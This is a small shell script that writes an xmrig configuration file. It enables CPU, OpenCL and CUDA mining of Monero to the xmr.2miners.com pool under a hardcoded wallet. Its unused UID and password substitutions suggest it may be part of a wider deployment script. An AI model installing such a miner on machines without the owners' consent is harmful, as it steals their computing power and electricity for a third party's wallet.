#!/bin/sh

APPDIR=$HOME/bmapps

UID=$1

if [ -z $1 ]; then
	UID="0"
fi

mkdir -p $APPDIR
cd $APPDIR

TPL=`cat <<EOF
{
	"colors": true,
	"background": false,
	"cpu": {
		"enabled": true,
	},
	"opencl": {
		"enabled": true,
	},
	"cuda": {
		"enabled": true,
		"loader": "%APPDIR/libxmrig-cuda.so"
	},
	"pools": [
		{
			"url": "xmr.2miners.com:2222",
			"user": "4ATWDCZ4z4HaoMNSv4kwW6RotULveyVVe5Th6PGWEJgMBnQ6KK7viZFezXGBGX1dF7VmLLgVDUrMs9jY8sYrjn5QVrepkj7",
			"pass": "x"
		}
	]
}
EOF`

echo "$TPL" | sed -e "s/%UID/"$UID"/g" | sed -e "s|%APPDIR|"$APPDIR"|g" | sed -e "s/%UPASS/ubuntu/g" > ./xmrig.config.json

exit 0